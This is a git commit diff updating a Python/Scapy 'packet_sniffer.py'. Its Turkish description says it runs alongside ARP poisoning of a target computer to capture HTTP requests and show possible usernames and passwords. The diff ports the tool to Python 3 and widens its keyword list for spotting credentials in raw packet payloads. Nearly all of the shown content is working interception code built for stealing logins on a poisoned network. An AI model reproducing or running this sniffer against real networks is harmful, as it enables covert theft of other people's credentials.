43173e320db528922c4c20a4558d1a25f4c81d18
mustafadalga <25087769+mustafadalga@users.noreply.github.com>
2019-06-19 14:46:56 +0300

    Update packet_sniffer.py

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,15 +6,15 @@ from termcolor import colored
 import sys
 try:
 	import scapy.all as scapy
-	from scapy.layers import http
 except KeyboardInterrupt:
 	print(colored("\n[-] CTRL+C basıldı.ARP tablosu sıfırlanıyor... Lütfen bekleyiniz...", "red"))
 	print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
 	sys.exit()
+import scapy_http.http as http
+
 
 
 class Sniffer():
-
 	def __init__(self):
 		self.about()
 		self.script_desc()
@@ -39,29 +39,30 @@ class Sniffer():
 
 	def get_login_info(self,paket):
 		if paket.haslayer(scapy.Raw):
-			load=paket[scapy.Raw].load
-			keywords=["username","user","pass","password","sifre","ad","login","kullanici","kullaniciadi","kullaniciAdi","parola","session_key","session_password"]
-			for keyword in keywords:
-				if keyword in load:
-					return load
+			try:
+				load = (paket[scapy.Raw].load).decode("utf-8")
+				keywords = ["username", "user", "pass", "password", "sifre", "ad", "login", "kullanici", "kullaniciadi","kullaniciAdi", "parola", "session_key", "session_password", "log", "pwd"]
+				for keyword in keywords:
+					if keyword in load:
+						return load
+			except UnicodeDecodeError:
+				pass
+
 
 	def process_sniffed_packet(self,paket):
 		if paket.haslayer(http.HTTPRequest):
 			url=self.get_url(paket)
-			print("[+] HTTP Request >> "+url)
+			print("[+] HTTP Request >> "+url.decode("utf-8"))
 			login_info=self.get_login_info(paket)
 			if login_info:
-				print("\n\n[+] Olası kullanıcı adı / Parola > "+login_info+"\n\n")
+				print("\n\n[+] Olası kullanıcı adı / Parola > "+str(login_info)+"\n\n")
 
 
 	def script_desc(self):
 		self.program = "packet_sniffer"
-		self.kullanim ="""Kullanim: python packet_sniffer_yedek.py --interface ARAYUZ\nOrnek Kullanim: python packet_sniffer_yedek.py --interface eth0"""
-		if sys.version_info[0] >= 3:
-			self.description = "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler."
-		else:
-			self.description = unicode("Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler.","utf8")
-			self.kullanim = unicode(self.kullanim, "utf8")
+		self.kullanim ="""Kullanim: python packet_sniffer.py --interface ARAYUZ\nOrnek Kullanim: python packet_sniffer.py --interface eth0"""
+		self.description = "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler."
+
 
 	def about(self):
 		print(colored(" ____            _        _     ____        _  __  __           ", "green"))
@@ -69,13 +70,14 @@ class Sniffer():
 		print(colored("| |_) / _` |/ __| |/ / _ \ __| \___ \| '_ \| | |_| |_ / _ \ '__|", "green"))
 		print(colored("|  __/ (_| | (__|   <  __/ |_   ___) | | | | |  _|  _|  __/ |   ", "green"))
 		print(colored("|_|   \__,_|\___|_|\_\___|\__| |____/|_| |_|_|_| |_|  \___|_|   ", "green"))
-		print(colored("# author      :", "green") + "Mustafa Dalga")
-		print(colored("# linkedin    :", "green") + "https://www.linkedin.com/in/mustafadalga")
-		print(colored("# github      :", "green") + "https://github.com/mustafadalga")
-		print(colored("# title       :", "green") + "packet_sniffer.py")
-		print(colored("# description :", "green") + "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler.")
-		print(colored("# date        :", "green") + "22.02.2019")
-		print(colored("# version     :", "green") + "1.0")
+		print(colored("# author  	:", "green") + "Mustafa Dalga")
+		print(colored("# linkedin  	:", "green") + "https://www.linkedin.com/in/mustafadalga")
+		print(colored("# github   	:", "green") + "https://github.com/mustafadalga")
+		print(colored("# title     	:", "green") + "packet_sniffer.py")
+		print(colored("# description   :", "green") + "Arp Spoofer ile hedef bilgisayar üzerinde ARP zehirlemesi yaparken ,Bu script ile aynı anda http isteklerini dinlemeye alarak olası kullanıcı adı / parola girişlerini görüntüler.")
+		print(colored("# date          :", "green") + "22.02.2019")
+		print(colored("# version       :", "green") + "1.0")
+		print(colored("# python_version:", "green") + "3.7.2")
 		print(colored("# ==============================================================================", "green"))
 
 
